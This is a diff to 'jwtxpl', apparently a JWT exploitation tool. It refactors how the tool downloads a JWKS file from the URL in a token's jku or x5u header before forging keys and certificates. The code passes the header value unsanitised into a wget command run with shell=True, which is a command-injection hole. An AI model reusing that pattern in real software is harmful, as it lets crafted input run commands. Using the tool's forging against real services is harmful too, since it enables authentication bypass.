@@ -626,18 +626,13 @@ class Cracker:
         accesses it to change the modulus and the exponent with the ones of our generated key. Then creates a new
         file named jwks.json in the crafted/ directory and writes the dump of the jwks dict into it.
         """
-        command = "wget " + header['jku']
+        filename = "jwtxpl_jwks.json"
+        command = f"wget -O {filename} " + header['jku']
         try:
             command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
         except subprocess.CalledProcessError:
             print(f"{Bcolors.FAIL}jwtxpl: err: Can't download jwks file from url specified in jku header{Bcolors.ENDC}")
             sys.exit(1)
-        for file in os.listdir():
-            if file.endswith(".json"):
-                filename = file
-                break
-        else:
-            filename = header['jku'].split("/")[-1] if header['jku'].split("/")[-1].endswith(".json") else header['jku'].split("/")[-2]
         with open(filename) as jwks_orig_file:
             jwks_dict = json.load(jwks_orig_file)
         if len(jwks_dict['keys']) == 1:
@@ -676,18 +671,13 @@ class Cracker:
 
         :return: The crafted jwks string in an HTTP response body format.
         """
-        command = "wget " + header['jku']
+        filename = "jwtxpl_jwks.json"
+        command = f"wget -O {filename} " + header['jku']
         try:
             command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
         except subprocess.CalledProcessError:
             print(f"{Bcolors.FAIL}jwtxpl: err: Can't download jwks file from url specified in jku header{Bcolors.ENDC}")
             sys.exit(1)
-        for file in os.listdir():
-            if file.endswith(".json"):
-                filename = file
-                break
-        else:
-            filename = header['jku'].split("/")[-1] if header['jku'].split("/")[-1].endswith(".json") else header['jku'].split("/")[-2]
         with open(filename) as jwks_orig_file:
             jwks_dict = json.load(jwks_orig_file)
         if len(jwks_dict['keys']) == 1:
@@ -725,19 +715,13 @@ class Cracker:
         access it and changes the x5c (the X509 cert) with our generated one. Then creates a file named jwks.json
         under the crafted/ directory and write the dump of the jwks dict into it.
         """
-        command = "wget " + header['x5u']
+        filename = "jwtxpl_jwks.json"
+        command = f"wget -O {filename} " + header['x5u']
         try:
             command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
         except subprocess.CalledProcessError:
             print(f"{Bcolors.FAIL}jwtxpl: err: Can't download jwks file from url specified in x5u header{Bcolors.ENDC}")
             sys.exit(1)
-        # Retrieve the right filename    TODO: Implement it in a better way
-        for file in os.listdir():
-            if file.endswith(".json"):
-                filename = file
-                break
-        else:
-            filename = header['x5u'].split("/")[-1] if header['x5u'].split("/")[-1].endswith(".json") else header['x5u'].split("/")[-2]
         with open("testing.crt", 'r') as cert_file:
             x5c_ = "".join([line.strip() for line in cert_file if not line.startswith('---')])
         with open(filename) as jwks_orig_file:
@@ -776,18 +760,13 @@ class Cracker:
 
         :return: The crafted jwks string in an HTTP response body format.
         """
-        command = "wget " + header['x5u']
+        filename = "jwtxpl_jwks.json"
+        command = f"wget -O {filename} " + header['x5u']
         try:
             command_output = subprocess.check_output(command, shell=True, stdin=self.devnull, stderr=self.devnull)
         except subprocess.CalledProcessError:
             print(f"{Bcolors.FAIL}Can't download the jwks file from the url specified in x5u header{Bcolors.ENDC}")
             sys.exit(1)
-        for file in os.listdir():
-            if file.endswith(".json"):
-                filename = file
-                break
-        else:
-            filename = header['x5u'].split("/")[-1] if header['x5u'].split("/")[-1].endswith(".json") else header['x5u'].split("/")[-2]
         with open("testing.crt", 'r') as cert_file:
             x5c_ = "".join([line.strip() for line in cert_file if not line.startswith('---')])
         with open(filename) as jwks_orig_file:
